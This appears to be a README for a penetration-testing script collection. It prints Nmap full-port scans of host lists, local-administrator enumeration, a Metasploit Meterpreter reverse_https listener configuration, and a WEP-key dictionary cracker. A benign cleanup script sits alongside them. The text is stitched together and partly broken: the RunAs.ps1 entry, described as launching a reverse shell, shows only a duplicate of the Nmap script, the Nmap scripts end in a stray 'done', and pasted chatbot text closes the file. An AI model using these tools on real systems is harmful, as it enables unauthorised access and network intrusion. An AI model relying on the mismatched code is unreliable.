# Scripts

* LocalAdmins.ps1 - Checks a file of host servers for members of the Administrators, Remote Desktop Users, and Users local groups.
* NSLookUp.ps1 - Runs a NSLookUp query against a file of host servers.
* PrivateIP - Runs a Nmap scan on against a file of host servers with Private IP's to check both TCP and UDP ports.
* PublicIP - Runs a Nmap scan on against a file of host servers with Public IP's to check both TCP and UDP ports.
* RunAs.ps1 - Runs a 'RunAs' command to switch context of user whilst triggering and initiating a reverse shell to the attacker.
* Meterpreter.rc - Sets a Meterpreter listener/handler with options (msfconsole -q -r Meterpreter.rc).
* WEPCracker.py - Wrapper script to crack WEP using Airdecap-ng.
* SystemCleanUp.ps1 - This script cleans up temporary files older than 7 days, log files older than 30 days, and clears the Recycle Bin.


### LocalAdmins.ps1

```
$servers = Get-Content C:\servers.txt
$groups = 'Administrators', 'Remote Desktop Users', 'Users'
$results = foreach ($server in $servers) {
    foreach ($group in $groups) {
        $obj = [ADSI]"WinNT://$server/$group"
        $obj.Invoke('Members') | % {
            $path = ([adsi]$_).path
            [pscustomobject]@{
                Computer = $server
                Group = $group
                Domain = $(Split-Path (Split-Path $path) -Leaf)
                User = $(Split-Path $path -Leaf)
            }
        }
    }
}
$results
```

### NSLookUp.ps1

```
$servers = get-content "C:\temp\hostlist.txt"
foreach ($Server in $Servers)
{
    $Addresses = $null
    try {
        $Addresses = [System.Net.Dns]::GetHostAddresses("$Server").IPAddressToString
    }
    catch { 
        $Addresses = "Server IP cannot resolve."
    }
    foreach($Address in $addresses) {
        write-host $Server, $Address 
    }
}
```

### Private IP

```
#!/bin/bash
nmap -sC -sV -Pn -v -p- -iL ./Private -oG PrivateTCP.txt
nmap -sU -v -iL ./Private -oG PrivateUDP.txt
done
```

### Public IP

```
#!/bin/bash
nmap -sC -sV -Pn -v -p- -iL ./Public -oG PublicTCP.txt
nmap -sU -v -iL ./Public -oG PublicUDP.txt
done
```

### RunAs.ps1

```
#!/bin/bash
nmap -sC -sV -Pn -v -p- -iL ./Public -oG PublicTCP.txt
nmap -sU -v -iL ./Public -oG PublicUDP.txt
done
```

### Meterpreter.rc

```
use exploit/multi/handler 
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 192.168.49.91 
set LPORT 443
set ExitOnSession false 
exploit -j -z 
```

### WEPCracker.py

```
#!/usr/bin/python

import sys, binascii, re
from subprocess import Popen, PIPE

f = open(sys.argv[1], 'r')
for line in f:
    wepKey = re.sub(r'\W+', '', line)
    
    if len(wepKey) != 5 :
        continue
    hexKey = binascii.hexlify(wepKey)
    print "Trying with WEP key: " +wepKey + " Hex: " + hexKey
    p = Popen(['/usr/bin/airdecap-ng', '-w', hexKey, 'WEP-Advanced.cap'], stdout=PIPE)
    output = p.stdout.read()
    finalResult = output.split('\n')[4]
    
    if finalResult.find('1') != -1 :
        print "Success WEP Key Found: " + wepKey
        sys.exit(0)
print "Failure! WEP key could not be found with the existing dictionary!"
```

### SystemCleanup.ps1

```
# System Cleanup Script
# Removes temporary files, log files, and clears recycle bin to optimize system performance

Write-Host "Starting System Cleanup..." -ForegroundColor Green

# Function to delete files from a specified directory older than a certain number of days
function Cleanup-Files {
    param (
        [string]$Path,
        [int]$DaysOld = 7
    )
    if (Test-Path $Path) {
        Get-ChildItem -Path $Path -Recurse -File | Where-Object {
            $_.CreationTime -lt (Get-Date).AddDays(-$DaysOld)
        } | Remove-Item -Force -Verbose
    } else {
        Write-Host "Path $Path does not exist." -ForegroundColor Yellow
    }
}

# Cleaning Windows Temp folder
Write-Host "Cleaning Temp folder..." -ForegroundColor Cyan
Cleanup-Files -Path "$env:Temp" -DaysOld 7

# Cleaning system Temp folder
Write-Host "Cleaning System Temp folder..." -ForegroundColor Cyan
Cleanup-Files -Path "C:\Windows\Temp" -DaysOld 7

# Deleting old log files
Write-Host "Cleaning Log files..." -ForegroundColor Cyan
Cleanup-Files -Path "C:\Windows\Logs" -DaysOld 30
Cleanup-Files -Path "C:\ProgramData\Logs" -DaysOld 30

# Clearing Recycle Bin
Write-Host "Clearing Recycle Bin..." -ForegroundColor Cyan
Clear-RecycleBin -Confirm:$false -Verbose

Write-Host "System Cleanup Completed!" -ForegroundColor Green
```

How to Use:<br/>
Save the script as SystemCleanup.ps1.<br/>
Open PowerShell as an Administrator.<br/>
Run the script using: .\SystemCleanup.ps1.<br/>
This script cleans up temporary files older than 7 days, log files older than 30 days, and clears the Recycle Bin. You can customize the paths and retention periods as needed. Let me know if you need further assistance!
